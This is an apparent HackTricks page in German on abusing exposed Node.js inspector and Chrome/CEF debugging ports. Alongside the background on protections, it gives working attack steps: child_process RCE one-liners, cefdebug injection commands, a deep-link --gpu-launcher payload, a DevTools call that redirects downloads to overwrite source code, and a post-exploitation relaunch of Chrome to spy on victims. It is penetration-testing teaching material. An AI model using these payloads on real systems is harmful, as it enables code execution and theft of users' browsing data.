# Node Inspector/CEF Debug Missbrauch

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

[Aus den Dokumenten](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wenn mit dem `--inspect`-Schalter gestartet, lauscht ein Node.js-Prozess auf einen Debugging-Client. **Standardmäßig** wird er am Host und Port **`127.0.0.1:9229`** lauschen. Jeder Prozess erhält auch eine **eindeutige** **UUID**.

Inspektor-Clients müssen Hostadresse, Port und UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL wird etwas wie `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` aussehen.

{% hint style="warning" %}
Da der **Debugger vollen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein bösartiger Akteur, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle Privilegieneskalation**).
{% endhint %}

Es gibt mehrere Möglichkeiten, einen Inspektor zu starten:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn Sie einen überwachten Prozess starten, wird etwas Ähnliches wie dies angezeigt:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prozesse basierend auf **CEF** (**Chromium Embedded Framework**) müssen den Parameter verwenden: `--remote-debugging-port=9222`, um den **Debugger** zu öffnen (die SSRF-Schutzmaßnahmen bleiben sehr ähnlich). Stattdessen wird anstelle einer **NodeJS** **Debug**-Sitzung mit dem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) kommuniziert. Dies ist eine Schnittstelle zur Steuerung des Browsers, aber es gibt keine direkte RCE.

Wenn Sie einen debuggten Browser starten, wird etwas Ähnliches wie dies angezeigt:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSockets und die Same-Origin-Richtlinie <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet sind, können WebSocket- und HTTP-Anfragen gemäß dem Browser-Sicherheitsmodell stellen. Eine **initiale HTTP-Verbindung** ist erforderlich, um eine **eindeutige Debugger-Sitzungs-ID zu erhalten**. Die **Same-Origin-Richtlinie** **verhindert**, dass Websites in der Lage sind, **diese HTTP-Verbindung** herzustellen. Zur zusätzlichen Sicherheit gegen [**DNS-Rebinding-Angriffe**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** überprüft Node.js, dass die **'Host'-Header** für die Verbindung entweder eine **IP-Adresse** oder **`localhost`** oder **`localhost6`** genau angeben.

{% hint style="info" %}
Diese **Sicherheitsmaßnahmen verhindern die Ausnutzung des Inspektors**, um Code auszuführen, indem einfach eine HTTP-Anfrage gesendet wird (was durch Ausnutzen einer SSRF-Schwachstelle möglich wäre).
{% endhint %}

### Starten des Inspektors in laufenden Prozessen

Sie können das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, um ihn dazu zu bringen, den Inspektor am Standardport zu **starten**. Beachten Sie jedoch, dass Sie ausreichende Berechtigungen benötigen, sodass dies Ihnen möglicherweise **privilegierten Zugriff auf Informationen innerhalb des Prozesses** gewährt, jedoch keine direkte Privilegieneskalation.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Dies ist in Containern nützlich, da das **Herunterfahren des Prozesses und das Starten eines neuen** mit `--inspect` keine Option ist, da der **Container** mit dem Prozess **beendet** wird.
{% endhint %}

### Verbindung zum Inspector/Debugger herstellen

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` oder `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche "Konfigurieren" sollte sichergestellt werden, dass der **Zielhost und -port** korrekt aufgeführt sind. Das Bild zeigt ein Beispiel für eine Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (674).png>)

Mit dem **Befehlszeilenbefehl** können Sie eine Verbindung zu einem Debugger/Inspector herstellen:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, **Inspectors zu finden**, die lokal ausgeführt werden, und **Code in sie einzuspritzen**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Beachten Sie, dass **NodeJS RCE-Exploits nicht funktionieren**, wenn sie über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) mit einem Browser verbunden sind (Sie müssen die API überprüfen, um interessante Dinge damit zu tun).
{% endhint %}

## RCE in NodeJS Debugger/Inspector

{% hint style="info" %}
Wenn Sie hierher gekommen sind, um herauszufinden, wie Sie **RCE aus einem XSS in Electron erhalten**, überprüfen Sie bitte diese Seite.
{% endhint %}

Einige gängige Möglichkeiten, um **RCE** zu erhalten, wenn Sie sich mit einem Node **Inspector** verbinden, sind beispielsweise (es scheint, dass dies **nicht funktioniert, wenn Sie mit dem Chrome DevTools-Protokoll verbunden sind**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

Sie können die API hier überprüfen: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In diesem Abschnitt werde ich nur interessante Dinge auflisten, die ich gefunden habe, die von Leuten genutzt wurden, um dieses Protokoll auszunutzen.

### Parameterinjektion über Deep Links

Im [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine Anwendung, die auf CEF basiert, eine benutzerdefinierte URI im System registriert hat (workspaces://), die die vollständige URI empfing und dann die CEF-basierte Anwendung mit einer Konfiguration startete, die teilweise aus dieser URI erstellt wurde.

Es wurde festgestellt, dass die URI-Parameter URL-dekodiert und verwendet wurden, um die CEF-Basisanwendung zu starten, was einem Benutzer ermöglichte, die Flagge **`--gpu-launcher`** in der Befehlszeile einzufügen und beliebige Dinge auszuführen.

Also, ein Payload wie:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Dateien überschreiben

Ändern Sie den Ordner, in dem **heruntergeladene Dateien gespeichert werden sollen**, und laden Sie eine Datei herunter, um den häufig verwendeten **Quellcode** der Anwendung mit Ihrem **bösartigen Code** zu **überschreiben**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE und Exfiltration

Gemäß diesem Beitrag: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) ist es möglich, RCE zu erlangen und interne Seiten von theriver zu exfiltrieren.

### Post-Exploitation

In einer realen Umgebung und **nach Kompromittierung** eines Benutzer-PCs, der einen Chrome/Chromium-basierten Browser verwendet, könnten Sie einen Chrome-Prozess mit aktiviertem Debugging starten und den Debugging-Port weiterleiten, um darauf zuzugreifen. Auf diese Weise können Sie **alles inspizieren, was das Opfer mit Chrome macht, und sensible Informationen stehlen**.

Der unauffällige Weg besteht darin, **jeden Chrome-Prozess zu beenden** und dann etwas Ähnliches aufzurufen.
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referenzen

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
